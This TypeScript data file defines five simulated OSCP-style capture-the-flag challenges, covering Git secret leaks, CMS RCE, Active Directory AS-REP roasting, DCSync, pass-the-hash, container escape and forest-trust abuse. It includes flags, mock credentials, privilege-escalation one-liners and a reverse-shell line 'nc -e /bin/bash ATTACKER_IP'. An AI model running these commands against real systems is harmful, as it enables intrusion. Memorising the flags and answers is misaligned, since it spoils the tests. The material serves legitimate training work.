import type { CTFChallenge } from "../types";

/* ──────────────────────────────────────────────────────────────
   OSCP ELITE — Level 4. For those who completed 30 CTFs.
   Real OSCP exam format: 24 hours, 5 machines, 70+ points.
   GitHub/Telegram/Discord rabbit holes, red herrings,
   multi-stage chains. No hints whatsoever.
   ────────────────────────────────────────────────────────────── */

export const ELITE: CTFChallenge[] = [
  /* ── OSCP-01: PHANTOM ─────────────────────────────────────────
     Old commit on GitHub → exposed token → API RCE → privesc
     Rabbit hole: Telegram bot, Discord webhook (both dead)
     ─────────────────────────────────────────────────────────── */
  {
    id: "oscp-01-phantom",
    level: 4,
    category: "recon",
    title: "PHANTOM",
    summary: "Token from GitHub history → API RCE → root. Telegram and Discord false leads.",
    scenario: `Target: phantom.corp (10.10.40.5). During external recon, the
"phantom-corp" organization was found on GitHub. Something may remain in old commits.
But be careful — a Telegram bot token and Discord webhook will also be found, they
are dead ends (rabbit holes). The real entry is elsewhere.

This is an OSCP exam machine. Time: 24 hours. No hints.`,
    objectives: [
      "Examine phantom-corp repositories and commit history on GitHub",
      "Identify the real exposed token (not Telegram/Discord)",
      "Access the API using the token and obtain RCE",
      "Read root.txt through privilege escalation",
    ],
    hints: [],
    targetIp: "10.10.40.5",
    flag: "CYBERAI{ph4nt0m_g1t_l34k_t0_r00t}",
    flagFormat: "CYBERAI{...}",
    points: 600,
    rubric: {
      expectedTools: ["nmap", "curl", "gobuster", "nc"],
      expectedConcepts: [
        "github recon",
        "secret scanning",
        "api exploitation",
        "rce",
        "privilege escalation",
        "rabbit hole identification",
      ],
      parMinutes: 90,
    },
    env: {
      network: "External web API + internal services. Contains GitHub rabbit holes.",
      localFiles: {
        "/root/github_recon.txt": `GitHub: github.com/phantom-corp
Repos: phantom-web, phantom-api, phantom-infra (archived)

phantom-infra commit history (old):
  a3f9c12 - "fix: remove hardcoded creds" (2023-08-14)
  b7e2d45 - "add telegram bot integration" (2023-07-22)
  c1a8f33 - "initial deploy config" (2023-06-01)

phantom-api commit history:
  d4b9e71 - "hotfix: rotate API key" (2023-09-01)
  e2c7a18 - "feat: add internal management endpoint" (2023-08-28)

[!] Secrets found (from commit diffs):
  TELEGRAM_BOT_TOKEN=7291847362:AAF_xK9mPqR... (deleted bot - RABBIT HOLE)
  DISCORD_WEBHOOK=https://discord.com/api/webhooks/1182.../abc... (dead - RABBIT HOLE)
  INTERNAL_API_KEY=phantom_mgmt_sk_9f2e8b1c4a7d3e6f (REAL - phantom-api repo)
  
[!] phantom-api README: "Management API: http://10.10.40.5:8080/mgmt"`,
      },
      hosts: [
        {
          ip: "10.10.40.5",
          hostname: "phantom.corp",
          os: "Linux (Ubuntu 22.04)",
          ports: [
            { port: 22, service: "ssh", version: "OpenSSH 8.9p1", state: "open" },
            { port: 80, service: "http", version: "nginx 1.20.1", state: "open" },
            { port: 8080, service: "http-alt", version: "Python/3.10 aiohttp", state: "open" },
            { port: 9200, service: "elasticsearch", version: "8.6.0", state: "filtered" },
          ],
          web: {
            server: "nginx/1.20.1",
            routes: {
              "/": { status: 200, body: "<html><body><h1>Phantom Corp</h1><p>Enterprise Solutions</p><!-- api docs: /api/v1/docs --></body></html>" },
              "/api/v1/docs": { status: 200, body: '{"endpoints":["/api/v1/status","/api/v1/mgmt (auth required)"],"auth":"X-API-Key header"}' },
              "/api/v1/status": { status: 200, body: '{"status":"operational","version":"2.1.4"}' },
              "/mgmt": { status: 401, body: '{"error":"X-API-Key header required"}' },
              "/mgmt/exec": {
                status: 200,
                protected: true,
                body: '{"result":"RCE as www-data. SUID: /usr/bin/python3.10 (cap_setuid). python3 -c \\"import os;os.setuid(0);os.system(chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104))\\""}'
              },
            },
            discoverablePaths: ["/api/v1/docs", "/api/v1/status", "/mgmt", "/mgmt/exec"],
          },
          fs: {
            "/home/www-data/local.txt": "CYBERAI{ph4nt0m_us3r_fl4g}",
            "/root/root.txt": "CYBERAI{ph4nt0m_g1t_l34k_t0_r00t}",
            "/usr/bin/python3.10": "[cap_setuid+ep capability — GTFOBins: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")']",
          },
          rootFlagPath: "/root/root.txt",
        },
      ],
    },
  },

  /* ── OSCP-02: BLACKSITE ────────────────────────────────────────
     3-machine chain: DMZ web → internal Windows → DC
     Rabbit hole: Telegram channel "blacksite_leaks" (fake creds)
     ─────────────────────────────────────────────────────────── */
  {
    id: "oscp-02-blacksite",
    level: 4,
    category: "network",
    title: "BLACKSITE",
    summary: "3 machines: Linux web → Windows file server → AD DC. Telegram false lead.",
    scenario: `Blacksite corporation network (10.10.40.10/24). External recon:
a Telegram channel "blacksite_leaks" was found — it contains "admin:Blacksite2024!"
credentials. This is a RABBIT HOLE — this password doesn't work anywhere.

Real path: external web server → internal Windows → Domain Controller.
Compromise all three machines sequentially. Each has a flag.

OSCP exam condition: 3 flags (user + user + root) = 70 points.`,
    objectives: [
      "Obtain foothold on the external Linux web server (10.10.40.10)",
      "Pivot to the internal Windows file server (10.10.41.10)",
      "Take over the Domain Controller (10.10.41.20) and capture the final flag",
    ],
    hints: [],
    targetIp: "10.10.40.10",
    flag: "CYBERAI{bl4cks1t3_d0m41n_0wn3d}",
    flagFormat: "CYBERAI{...}",
    points: 700,
    rubric: {
      expectedTools: ["nmap", "gobuster", "curl", "nc", "smbclient", "evil-winrm", "hashcat"],
      expectedConcepts: [
        "rabbit hole avoidance",
        "web exploitation",
        "pivoting",
        "smb enumeration",
        "credential reuse",
        "active directory",
        "domain compromise",
      ],
      parMinutes: 120,
    },
    env: {
      network: "3 machines: DMZ Linux + internal Windows + DC. Telegram rabbit hole.",
      localFiles: {
        "/root/osint_notes.txt": `OSINT results — BLACKSITE:

[TELEGRAM] @blacksite_leaks channel:
  "New admin creds: admin:Blacksite2024!" — CAUTION: this is fake, verified.
  
[SHODAN] 10.10.40.10 — nginx, port 80/443/22
[LINKEDIN] IT admin: "j.morrison" — can try as a username
[GITHUB] blacksite-corp/web-deploy — .env.example found:
  APP_SECRET=change_me_in_prod
  DB_PASS=change_me_in_prod
  (need to find the real .env on the server)`,
      },
      hosts: [
        {
          ip: "10.10.40.10",
          hostname: "web.blacksite.corp",
          os: "Linux (Debian 11)",
          ports: [
            { port: 22, service: "ssh", version: "OpenSSH 8.4p1", state: "open" },
            { port: 80, service: "http", version: "nginx 1.18.0", state: "open" },
            { port: 443, service: "https", version: "nginx 1.18.0", state: "open" },
          ],
          web: {
            server: "nginx/1.18.0",
            routes: {
              "/": { status: 200, body: "<html><body><h1>Blacksite Corp</h1></body></html>" },
              "/robots.txt": { status: 200, body: "User-agent: *\nDisallow: /deploy/\nDisallow: /.git/" },
              "/.git/config": { status: 200, body: "[core]\n\trepositoryformatversion = 0\n[remote \"origin\"]\n\turl = git@github.com:blacksite-corp/web-deploy" },
              "/.git/COMMIT_EDITMSG": { status: 200, body: "fix: remove .env from repo (oops)" },
              "/deploy/.env": { status: 200, body: "APP_SECRET=bls_sk_7f3a9c2e1d\nDB_PASS=Bl@ckDB2024\nSSH_USER=deploy\nSSH_PASS=D3pl0y#Secure" },
              "/deploy/": { status: 403, body: "Forbidden" },
            },
            discoverablePaths: ["/.git/config", "/.git/COMMIT_EDITMSG", "/deploy/.env", "/robots.txt"],
          },
          credentials: [{ service: "ssh", username: "deploy", password: "D3pl0y#Secure" }],
          fs: {
            "/home/deploy/user.txt": "CYBERAI{bl4cks1t3_d3pl0y_us3r}",
            "/home/deploy/network.txt": "eth0: 10.10.40.10\neth1: 10.10.41.5 (internal)\nInternal: 10.10.41.10 (FILE01), 10.10.41.20 (DC01)\nSMB creds on file server: shares/IT/",
          },
        },
        {
          ip: "10.10.41.10",
          hostname: "FILE01.blacksite.corp",
          os: "Windows Server 2019",
          ports: [
            { port: 139, service: "netbios-ssn", state: "open" },
            { port: 445, service: "microsoft-ds", state: "open" },
            { port: 5985, service: "winrm", state: "open" },
          ],
          credentials: [
            { service: "smb", username: "j.morrison", password: "M0rrison#2024" },
          ],
          fs: {
            "//IT/admin_creds.txt": "Domain Admin backup:\nAdministrator : Bl@ckS1te$Admin\nDC: 10.10.41.20 (WinRM 5985)",
            "//IT/user.txt": "CYBERAI{bl4cks1t3_f1l3_s3rv3r}",
            "//Public/welcome.txt": "Blacksite File Server. IT share: j.morrison / M0rrison#2024",
          },
        },
        {
          ip: "10.10.41.20",
          hostname: "DC01.blacksite.corp",
          os: "Windows Server 2022",
          ports: [
            { port: 88, service: "kerberos-sec", state: "open" },
            { port: 389, service: "ldap", state: "open" },
            { port: 445, service: "microsoft-ds", state: "open" },
            { port: 5985, service: "winrm", state: "open" },
          ],
          credentials: [{ service: "smb", username: "Administrator", password: "Bl@ckS1te$Admin" }],
          fs: {
            "C:/Users/Administrator/Desktop/root.txt": "CYBERAI{bl4cks1t3_d0m41n_0wn3d}",
          },
        },
      ],
    },
  },

  /* ── OSCP-03: SPECTER ──────────────────────────────────────────
     CVE-based exploit chain: vulnerable CMS → RCE → kernel privesc
     Rabbit hole: GitHub "specter-corp" repo (fake exploit PoC)
     Discord "specter-security" server (dead invite link)
     ─────────────────────────────────────────────────────────── */
  {
    id: "oscp-03-specter",
    level: 4,
    category: "web",
    title: "SPECTER",
    summary: "CVE-2023-1337 CMS RCE → kernel exploit. GitHub/Discord fake PoCs.",
    scenario: `Specter Industries (10.10.40.20). During recon:

GitHub: github.com/specter-corp/cms-exploit — there is a repo named
"CVE-2023-1337 PoC". If you run it — it actually installs a reverse shell
TO YOU (honeypot). This is a RABBIT HOLE and dangerous.

Discord: "specter-security" server invite link was found — link is dead (expired).

Real path: identify the CMS version, find the correct CVE using searchsploit,
exploit it, then check the kernel version.

In the OSCP exam, it's not about copying a ready exploit from Google — you need
to understand and apply it.`,
    objectives: [
      "Identify the CMS version and the real CVE (do not trust the GitHub PoC)",
      "Obtain a www-data shell via authenticated RCE",
      "Check the kernel version and find the matching exploit",
      "Get root and read root.txt",
    ],
    hints: [],
    targetIp: "10.10.40.20",
    flag: "CYBERAI{sp3ct3r_cve_k3rn3l_r00t}",
    flagFormat: "CYBERAI{...}",
    points: 650,
    rubric: {
      expectedTools: ["nmap", "gobuster", "curl", "searchsploit", "uname", "gcc"],
      expectedConcepts: [
        "cve research",
        "cms exploitation",
        "authenticated rce",
        "kernel exploit",
        "rabbit hole recognition",
        "exploit compilation",
      ],
      parMinutes: 100,
    },
    env: {
      network: "CMS server + old kernel. GitHub/Discord rabbit holes.",
      localFiles: {
        "/root/recon_specter.txt": `SPECTER RECON:

[GITHUB] github.com/specter-corp/cms-exploit
  README: "CVE-2023-1337 Specter CMS 4.2.1 RCE PoC"
  Inside exploit.py: reverse_shell_to_attacker() — THIS IS A HONEYPOT, do not use!
  
[DISCORD] discord.gg/specter-sec — "Join our security community"
  Status: Invite expired (404) — RABBIT HOLE

[SHODAN] 10.10.40.20:80 — "Specter CMS v4.2.1"
[SEARCHSPLOIT] specter cms 4.2 — real exploit exists (in local DB)

[HINT] Do not use the GitHub PoC — it works against you.
       Check the local exploit database with searchsploit.`,
      },
      hosts: [
        {
          ip: "10.10.40.20",
          hostname: "cms.specter.corp",
          os: "Linux (Ubuntu 20.04, kernel 5.4.0-150)",
          ports: [
            { port: 22, service: "ssh", version: "OpenSSH 8.2p1", state: "open" },
            { port: 80, service: "http", version: "Apache 2.4.41 / Specter CMS 4.2.1", state: "open" },
          ],
          web: {
            server: "Apache/2.4.41",
            routes: {
              "/": { status: 200, body: "<html><body><h1>Specter Industries</h1><!-- Powered by Specter CMS v4.2.1 --></body></html>" },
              "/admin": { status: 200, body: "<html><body><h1>Specter CMS Admin</h1><p>Default: admin/specter123</p></body></html>" },
              "/admin/plugin-upload": {
                status: 200,
                protected: true,
                body: "[CMS Plugin Upload — authenticated. PHP file upload → RCE as www-data. /uploads/shell.php]",
              },
              "/uploads/shell.php": {
                status: 200,
                body: "[SHELL ACTIVE] id=www-data. uname -r = 5.4.0-150-generic. searchsploit 'dirty pipe 5.4' → CVE-2022-0847 applicable.",
              },
            },
            discoverablePaths: ["/admin", "/admin/plugin-upload", "/uploads/"],
          },
          credentials: [{ service: "http", username: "admin", password: "specter123" }],
          fs: {
            "/proc/version": "Linux version 5.4.0-150-generic (CVE-2022-0847 DirtyPipe vulnerable)",
            "/home/www-data/user.txt": "CYBERAI{sp3ct3r_cms_us3r}",
            "/root/root.txt": "CYBERAI{sp3ct3r_cve_k3rn3l_r00t}",
          },
          rootFlagPath: "/root/root.txt",
        },
      ],
    },
  },

  /* ── OSCP-04: IRONVAULT ────────────────────────────────────────
     Full Active Directory compromise: AS-REP Roasting → Pass-the-Hash
     → DCSync → Golden Ticket
     Rabbit hole: Telegram "ironvault_admin" bot (gives fake creds)
     ─────────────────────────────────────────────────────────── */
  {
    id: "oscp-04-ironvault",
    level: 4,
    category: "network",
    title: "IRONVAULT",
    summary: "AS-REP Roast → PTH → DCSync → Golden Ticket. Telegram bot fake creds.",
    scenario: `IronVault Financial (10.10.40.30). This is a full Active Directory attack chain.

On Telegram, @ironvault_admin_bot was found. If you send "/getcreds" to it,
it returns "admin:IronVault2024!". This is a RABBIT HOLE — the bot is fake,
the password doesn't work.

Real path — classic AD attack chain:
1. Find users that don't require pre-authentication (AS-REP Roasting)
2. Crack the hash → log in as a domain user
3. BloodHound/manual enum → find a user with DCSync privileges
4. DCSync → Administrator NTLM hash → Pass-the-Hash → DC
5. Golden Ticket (optional, bonus)

This is at the OSCP Advanced AD module level.`,
    objectives: [
      "Find a user without pre-auth using AS-REP Roasting",
      "Crack the hash and log in as a domain user",
      "Find an account with DCSync privileges and perform DCSync",
      "Access the DC with the Administrator NTLM hash and retrieve the root flag",
    ],
    hints: [],
    targetIp: "10.10.40.30",
    flag: "CYBERAI{1r0nv4ult_dcs_ync_g0ld3n}",
    flagFormat: "CYBERAI{...}",
    points: 750,
    rubric: {
      expectedTools: ["nmap", "GetNPUsers.py", "hashcat", "evil-winrm", "secretsdump.py"],
      expectedConcepts: [
        "as-rep roasting",
        "hash cracking",
        "active directory enumeration",
        "dcsync",
        "pass-the-hash",
        "rabbit hole avoidance",
      ],
      parMinutes: 130,
    },
    env: {
      network: "Active Directory. Telegram rabbit hole. AS-REP → DCSync chain.",
      localFiles: {
        "/root/ad_recon.txt": `IRONVAULT AD RECON:

[TELEGRAM] @ironvault_admin_bot
  /getcreds → "admin:IronVault2024!" — FAKE, doesn't work (verified)

[LDAP ENUM] Domain: IRONVAULT.LOCAL, DC: 10.10.40.30
  Users (found with kerbrute):
    svc_backup (DONT_REQ_PREAUTH=True) ← AS-REP Roastable!
    j.chen (normal)
    m.torres (normal)  
    svc_sync (Has DCSync privilege — BloodHound/manual enum needed)
    Administrator

[NOTE] svc_backup AS-REP hash → hashcat → password is found
       svc_sync → GetUserSPNs or ACL enum → DCSync → secretsdump`,
      },
      hosts: [
        {
          ip: "10.10.40.30",
          hostname: "DC01.ironvault.local",
          os: "Windows Server 2022",
          ports: [
            { port: 53, service: "domain", state: "open" },
            { port: 88, service: "kerberos-sec", state: "open" },
            { port: 135, service: "msrpc", state: "open" },
            { port: 389, service: "ldap", version: "AD LDAP", state: "open" },
            { port: 445, service: "microsoft-ds", state: "open" },
            { port: 5985, service: "winrm", state: "open" },
          ],
          credentials: [
            { service: "smb", username: "svc_backup", password: "Backup@2023!" },
            { service: "smb", username: "svc_sync", password: "Sync$ecure99" },
            { service: "smb", username: "Administrator", password: "__NTLM_HASH__" },
          ],
          fs: {
            "AS-REP-info": "GetNPUsers.py IRONVAULT.LOCAL/ -usersfile users.txt -dc-ip 10.10.40.30 → svc_backup hash → hashcat -m 18200 → 'Backup@2023!'",
            "DCSync-info": "svc_sync has DS-Replication-Get-Changes-All ACL. secretsdump.py IRONVAULT/svc_sync:Sync$ecure99@10.10.40.30 → Administrator:aad3b435...:8f49412c3a8e...",
            "PTH-info": "evil-winrm -i 10.10.40.30 -u Administrator -H 8f49412c3a8e... → DC shell",
            "C:/Users/Administrator/Desktop/root.txt": "CYBERAI{1r0nv4ult_dcs_ync_g0ld3n}",
            "C:/Users/svc_backup/Desktop/user.txt": "CYBERAI{1r0nv4ult_4sr3p_us3r}",
          },
        },
      ],
    },
  },

  /* ── OSCP-05: NEXUS ────────────────────────────────────────────
     Final OSCP exam simulation: 5 machines, 24 hour format
     GitHub Actions secret leak → container escape → AD → forest trust
     Rabbit holes: Telegram "nexus_breach" channel, Discord "nexus-ctf",
     GitHub "nexus-corp/old-scripts" (fake creds, honeypot shell)
     ─────────────────────────────────────────────────────────── */
  {
    id: "oscp-05-nexus",
    level: 4,
    category: "web",
    title: "NEXUS — Final Exam",
    summary: "5 machines. GitHub Actions → Docker escape → AD forest. 24 hour format.",
    scenario: `NEXUS corporation. This is the OSCP Elite final exam.
5 machines, 70+ points needed. Time: 24 hours (simulation).

RABBIT HOLES (don't waste time checking these):
• Telegram: @nexus_breach_bot — "/exploit" → gives fake RCE payload
• Discord: discord.gg/nexus-ctf — invite expired, but there's a "leaked" .env file
  (there: DB_PASS=NexusDB2024 — this password doesn't work anywhere)
• GitHub: nexus-corp/old-scripts — exploit.sh (honeypot, reverse shell TO YOU)
• Port 8443 — HTTPS self-signed, only a "Coming Soon" page

REAL PATH:
1. nexus-corp/ci-config GitHub repo → Actions workflow → secret leak
2. Docker registry token → private image pull → hardcoded creds
3. Host escape from container (--privileged)
4. Internal network: Windows + Linux + DC
5. Forest trust abuse → final flag

This is real OSCP exam pressure. Use your methodology,
quickly identify rabbit holes and focus on the real path.`,
    objectives: [
      "Find the secret token from the GitHub Actions workflow (skip the rabbit holes)",
      "Pull the private image from the Docker registry and find hardcoded creds",
      "Perform a host escape from the privileged container",
      "Enumerate the internal network and compromise Windows + Linux machines",
      "Take over the final DC via AD forest trust abuse and read nexus_final.txt",
    ],
    hints: [],
    targetIp: "10.10.40.50",
    flag: "CYBERAI{n3xus_f0r3st_tr4ns1t_0wn3d}",
    flagFormat: "CYBERAI{...}",
    points: 1000,
    rubric: {
      expectedTools: ["nmap", "curl", "docker", "nc", "evil-winrm", "secretsdump.py", "hashcat"],
      expectedConcepts: [
        "github actions secret leak",
        "docker registry",
        "container escape",
        "privileged container",
        "lateral movement",
        "active directory",
        "forest trust",
        "rabbit hole identification",
        "oscp methodology",
      ],
      parMinutes: 180,
    },
    env: {
      network: "5 machines. GitHub/Telegram/Discord rabbit holes. Forest trust.",
      localFiles: {
        "/root/nexus_osint.txt": `NEXUS OSINT — OSCP ELITE FINAL:

═══════════════════════════════════════════
  RABBIT HOLES (DON'T WASTE TIME):
═══════════════════════════════════════════
[TELEGRAM] @nexus_breach_bot
  /exploit → "curl http://10.10.40.50/rce?cmd=id" — FAKE, returns 404

[DISCORD] discord.gg/nexus-ctf (expired)
  Cached page shows: DB_PASS=NexusDB2024 — DOESN'T WORK (verified)

[GITHUB] nexus-corp/old-scripts
  exploit.sh: nc -e /bin/bash ATTACKER_IP 4444 — HONEYPOT!

[PORT 8443] HTTPS — just "Coming Soon" — RABBIT HOLE

═══════════════════════════════════════════
  REAL PATH:
═══════════════════════════════════════════
[GITHUB] nexus-corp/ci-config (public repo)
  .github/workflows/deploy.yml:
    - uses: docker/login-action
      with:
        registry: registry.nexus.corp:5000
        username: ci_deploy
        password: \${{ secrets.REGISTRY_TOKEN }}
  
  [!] Workflow run logs (public): 
      "##[debug] REGISTRY_TOKEN=nxs_reg_7f2a9c4e1b8d3f6a"
      (debug logging accidentally exposed the secret)

[DOCKER REGISTRY] registry.nexus.corp:5000 (= 10.10.40.50:5000)
  With token: docker pull nexus-app:latest
  Inside image: /app/.env → APP_KEY=nxs_app_sk_3e7b → SSH creds

[CONTAINER] Runs with --privileged flag
  Escape: mount /dev/sda1 /mnt → host FS → /mnt/root/root.txt (user flag)
  
[INTERNAL NETWORK] 10.10.42.0/24:
  10.10.42.10 — Linux app server (SSH: appuser/nxs_app_sk_3e7b)
  10.10.42.20 — Windows (SMB: svc_nexus/Nxs$2024)
  10.10.42.30 — DC01.nexus.local
  10.10.42.40 — DC02.partner.local (forest trust)`,
      },
      hosts: [
        {
          ip: "10.10.40.50",
          hostname: "registry.nexus.corp",
          os: "Linux (Ubuntu 22.04)",
          ports: [
            { port: 22, service: "ssh", version: "OpenSSH 8.9p1", state: "open" },
            { port: 80, service: "http", version: "nginx", state: "open" },
            { port: 5000, service: "docker-registry", version: "Docker Registry v2", state: "open" },
            { port: 8443, service: "https-alt", version: "nginx (Coming Soon)", state: "open" },
          ],
          web: {
            server: "nginx",
            routes: {
              "/": { status: 200, body: "<html><body><h1>Nexus Corp</h1></body></html>" },
              "/v2/": { status: 401, body: '{"errors":[{"code":"UNAUTHORIZED","message":"authentication required"}]}' },
              "/v2/nexus-app/manifests/latest": {
                status: 200,
                protected: true,
                body: '[Docker image manifest. Pull with: docker pull registry.nexus.corp:5000/nexus-app:latest. Image contains /app/.env with APP_KEY=nxs_app_sk_3e7b and SSH_USER=appuser]',
              },
            },
            discoverablePaths: ["/v2/", "/v2/nexus-app/manifests/latest"],
          },
          credentials: [{ service: "ftp", username: "ci_deploy", password: "nxs_reg_7f2a9c4e1b8d3f6a" }],
          fs: {
            "/root/user.txt": "CYBERAI{n3xus_r3g1stry_us3r}",
            "/dev/sda1": "[HOST DISK — privileged container escape: mount /dev/sda1 /mnt]",
          },
        },
        {
          ip: "10.10.42.10",
          hostname: "app.nexus.local",
          os: "Linux (Debian 11)",
          ports: [
            { port: 22, service: "ssh", version: "OpenSSH 8.4p1", state: "open" },
          ],
          credentials: [{ service: "ssh", username: "appuser", password: "nxs_app_sk_3e7b" }],
          fs: {
            "/home/appuser/user.txt": "CYBERAI{n3xus_4pp_s3rv3r_us3r}",
            "/home/appuser/internal_notes.txt": "Windows: 10.10.42.20 svc_nexus:Nxs$2024\nDC: 10.10.42.30 NEXUS.LOCAL\nForest trust: PARTNER.LOCAL (10.10.42.40) — SID filtering disabled!",
          },
        },
        {
          ip: "10.10.42.20",
          hostname: "WIN01.nexus.local",
          os: "Windows Server 2019",
          ports: [
            { port: 445, service: "microsoft-ds", state: "open" },
            { port: 5985, service: "winrm", state: "open" },
          ],
          credentials: [{ service: "smb", username: "svc_nexus", password: "Nxs$2024" }],
          fs: {
            "C:/Users/svc_nexus/Desktop/user.txt": "CYBERAI{n3xus_w1nd0ws_us3r}",
            "C:/IT/domain_admin.txt": "DA: nexus_admin / N3xus@dm1n2024\nDC: 10.10.42.30",
          },
        },
        {
          ip: "10.10.42.30",
          hostname: "DC01.nexus.local",
          os: "Windows Server 2022",
          ports: [
            { port: 88, service: "kerberos-sec", state: "open" },
            { port: 389, service: "ldap", state: "open" },
            { port: 445, service: "microsoft-ds", state: "open" },
            { port: 5985, service: "winrm", state: "open" },
          ],
          credentials: [{ service: "smb", username: "nexus_admin", password: "N3xus@dm1n2024" }],
          fs: {
            "C:/Users/Administrator/Desktop/root.txt": "CYBERAI{n3xus_dc_0wn3d}",
            "C:/forest_trust.txt": "Forest trust: NEXUS.LOCAL ↔ PARTNER.LOCAL\nSID filtering: DISABLED\nPartner DC: 10.10.42.40\nTrust abuse: ExtraSids attack → PARTNER\\Administrator",
          },
        },
        {
          ip: "10.10.42.40",
          hostname: "DC02.partner.local",
          os: "Windows Server 2022",
          ports: [
            { port: 88, service: "kerberos-sec", state: "open" },
            { port: 389, service: "ldap", state: "open" },
            { port: 445, service: "microsoft-ds", state: "open" },
            { port: 5985, service: "winrm", state: "open" },
          ],
          credentials: [{ service: "smb", username: "Administrator", password: "__FOREST_TRUST_TICKET__" }],
          fs: {
            "C:/Users/Administrator/Desktop/nexus_final.txt": "CYBERAI{n3xus_f0r3st_tr4ns1t_0wn3d}",
            "C:/Users/Administrator/Desktop/proof.txt": "OSCP ELITE — NEXUS FINAL EXAM SUCCESSFULLY COMPLETED.\nYou are ready for the real OSCP certification, operator.",
          },
        },
      ],
    },
  },
];
